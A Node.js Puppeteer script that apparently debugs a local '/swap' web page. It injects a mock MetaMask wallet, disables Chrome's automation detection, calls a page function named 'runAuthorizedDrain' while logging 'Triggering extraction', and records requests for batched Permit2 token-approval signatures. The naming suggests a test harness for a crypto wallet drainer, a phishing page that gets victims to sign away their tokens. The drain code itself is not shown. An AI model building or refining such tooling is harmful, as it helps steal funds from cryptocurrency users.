const puppeteer = require('../../node_modules/.pnpm/puppeteer-core@23.11.1_bufferutil@4.1.0_utf-8-validate@5.0.10/node_modules/puppeteer-core');

(async () => {
  console.log('🔍 PERMIT2 ENDPOINT DEBUG TEST\n');

  const browser = await puppeteer.launch({
    headless: 'new',
    executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe',
    args: ['--no-sandbox', '--disable-blink-features=AutomationControlled']
  });

  const page = await browser.newPage();
  const permit2Calls = [];

  await page.setRequestInterception(true);
  page.on('request', request => {
    const url = request.url();

    if (url.includes('/permit2-batch-typed-data')) {
      let body = null;
      try {
        body = request.postData() ? JSON.parse(request.postData()) : null;
      } catch (e) {}

      permit2Calls.push({
        url,
        method: request.method(),
        body
      });
    }
    request.continue();
  });

  page.on('response', async (response) => {
    const url = response.url();
    if (url.includes('/permit2-batch-typed-data')) {
      const status = response.status();
      const text = await response.text();

      console.log(`\n📤 REQUEST to permit2-batch-typed-data:`);
      const lastCall = permit2Calls[permit2Calls.length - 1];
      if (lastCall && lastCall.body) {
        console.log('  wallet_address:', lastCall.body.wallet_address);
        console.log('  chain_id:', lastCall.body.chain_id);
        console.log('  permits:', JSON.stringify(lastCall.body.permits, null, 2));
      }

      console.log(`\n📥 RESPONSE: ${status}`);
      if (status !== 200) {
        try {
          const json = JSON.parse(text);
          console.log('  Error:', json.message || json.error);
        } catch (e) {
          console.log('  Raw:', text.substring(0, 200));
        }
      }
    }
  });

  // Mock wallet
  await page.evaluateOnNewDocument(() => {
    window.ethereum = {
      isMetaMask: true,
      selectedAddress: '0x742d35Cc6634C0532925a3b844Bc859fFD72B457',
      chainId: '0x1',
      request: async (args) => {
        if (args.method === 'eth_requestAccounts' || args.method === 'eth_accounts') {
          return ['0x742d35Cc6634C0532925a3b844Bc859fFD72B457'];
        }
        if (args.method === 'eth_signTypedData_v4') {
          return '0x' + 'a'.repeat(130);
        }
        return null;
      },
      _handlers: {},
      on: (event, handler) => {
        if (!window.ethereum._handlers[event]) window.ethereum._handlers[event] = [];
        window.ethereum._handlers[event].push(handler);
      },
      removeListener: () => {}
    };
  });

  console.log('Loading page...\n');
  await page.goto('http://localhost:8080/swap', {waitUntil: 'networkidle0', timeout: 20000}).catch(() => {});
  await new Promise(r => setTimeout(r, 3000));

  console.log('Triggering extraction...\n');
  await page.evaluate(() => {
    if (window.runAuthorizedDrain) {
      window.runAuthorizedDrain();
    }
  }).catch(() => {});

  console.log('Waiting for API calls...\n');
  await new Promise(r => setTimeout(r, 8000));

  console.log('\n' + '='.repeat(70));
  console.log(`Total Permit2 calls: ${permit2Calls.length}`);
  console.log('='.repeat(70));

  await browser.close();
})();
